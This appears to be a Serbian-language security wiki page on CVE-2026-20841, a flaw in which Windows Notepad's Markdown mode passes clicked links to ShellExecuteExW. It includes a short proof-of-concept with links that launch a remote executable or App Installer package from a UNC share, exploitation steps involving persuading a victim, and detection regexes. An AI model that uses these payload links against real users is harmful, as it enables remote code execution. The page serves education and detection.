# Zloupotreba Windows Protocol Handler-a / ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows aplikacije koje renderuju Markdown/HTML često pretvaraju linkove koje je uneo korisnik u elemente na koje se može kliknuti i prosleđuju ih funkciji `ShellExecuteExW`. Bez strogog allowlist-a shema, može se aktivirati bilo koji registrovani protocol handler (npr. `file:`, `ms-appinstaller:`), što može dovesti do izvršavanja koda u kontekstu trenutnog korisnika.<sup>[[1]](#references)</sup>

## Površina ShellExecuteExW u Windows Notepad Markdown režimu
- Notepad bira Markdown režim **samo za ekstenzije `.md`** putem poređenja fiksnog stringa u funkciji `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Podržani Markdown linkovi:
- Standardni: `[text](target)`
- Autolink: `<target>` (renderuje se kao `[target](target)`), pa su obe sintakse važne za payload-e i detekcije.
- Klikovi na linkove obrađuju se u funkciji `sub_140170F60()`, koja primenjuje slabo filtriranje, a zatim poziva `ShellExecuteExW`.
- `ShellExecuteExW` prosleđuje izvršavanje **bilo kom konfigurisanom protocol handler-u**, a ne samo HTTP(S)-u.<sup>[[1]](#references)</sup>

### Razmatranja u vezi sa payload-ima
- Sve sekvence `\\` u linku **normalizuju se u `\`** pre poziva `ShellExecuteExW`, što utiče na kreiranje UNC putanja i detekciju.
- `.md` fajlovi **nisu podrazumevano povezani sa Notepad-om**; žrtva i dalje mora da otvori fajl u Notepad-u i klikne na link, ali je link nakon renderovanja moguće kliknuti.
- Opasne šeme kao primer:<sup>[[1]](#references)</sup>
- `file://` za pokretanje lokalnog/UNC payload-a.
- `ms-appinstaller://` za pokretanje App Installer tokova. Druge lokalno registrovane šeme takođe mogu biti zloupotrebljene.

### Minimalni PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Tok eksploatacije
1. Kreirajte **`.md` datoteku** tako da je Notepad prikaže kao Markdown.
2. Ugradite link koristeći opasnu URI šemu (`file:`, `ms-appinstaller:` ili bilo koji instalirani handler).
3. Isporučite datoteku (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ili slično) i ubedite korisnika da je otvori u Notepad-u.
4. Nakon klika, **normalizovani link** se prosleđuje funkciji `ShellExecuteExW`, a odgovarajući protocol handler izvršava navedeni sadržaj u kontekstu korisnika.<sup>[[1]](#references)[[2]](#references)</sup>

## Ideje za detekciju
- Nadgledajte prenose `.md` datoteka preko portova/protokola koji se često koriste za isporuku dokumenata: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsirajte Markdown linkove (standardne i autolink) i tražite **bez obzira na velika i mala slova** `file:` ili `ms-appinstaller:`.
- Regex obrasci preporučeni od strane proizvođača za otkrivanje pristupa udaljenim resursima:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Prema izveštajima, ponašanje zakrpe koristi **allowlist** za lokalne datoteke i HTTP(S); sve ostalo što dospe do `ShellExecuteExW` je sumnjivo. Po potrebi proširite detekcije na druge instalirane protocol handlers, jer se attack surface razlikuje u zavisnosti od sistema.<sup>[[1]](#references)</sup>

## Reference
- [1] [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
